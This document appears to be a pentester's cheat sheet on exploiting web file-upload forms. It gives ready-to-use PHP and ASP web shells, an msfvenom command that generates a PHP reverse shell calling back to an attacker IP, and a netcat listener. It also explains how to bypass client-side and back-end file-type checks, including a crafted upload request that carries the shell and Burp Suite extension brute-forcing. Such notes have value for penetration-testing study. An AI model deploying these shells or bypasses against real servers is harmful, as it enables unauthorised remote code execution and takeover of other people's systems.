
Below is an example of simple web shell
<?php system($_REQUEST['cmd']); ?>

usage: http://SERVER_IP:PORT/uploads/shell.php?cmd=id


Here is an example for a .NET application using asp
<% eval request('cmd') %>


Creating a php reverse shell with msfvenom
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php

After the above file is uploaded. Use NC to listen for the connection
nc -lvnp OUR_PORT


Front-end validation is a common technique used to prevent users from uploading files that are not allowed.

Any code that runs on the client-side is under our control. 
While the web server is responsible for sending the front-end code, the rendering and execution of the front-end code happen within our browser. 
If the web application does not apply any of these validations on the back-end, we should be able to upload any file type.

As mentioned earlier, to bypass these protections, we can either modify the upload request to the back-end server, 
or we can manipulate the front-end code to disable these type validations.

Look out for code like this:
    <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
modify it accordingly to accept your file Type
Also be aware of the onchange function. You should also modify the function to accept your file.
Also be aware of any <form> tags that validate upon submission.

Another way to bypass client-side validation is to use a proxy like Burp Suite to intercept the request and modify the file type.
When doing it like this, make sure you change the file extension and contents.
Dont modify the Content-Type header. It should be set to the file type you are uploading.

Ex. 
...
filename="shell.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
...


Backend validation
There are generally two common forms of validating a file extension on the back-end:

Testing against a blacklist of types
Testing against a whitelist of types

You can use burpsuites sniper to brute force the file extension
Example in request: filename="example$.php$"
make sure to un-tick url encoding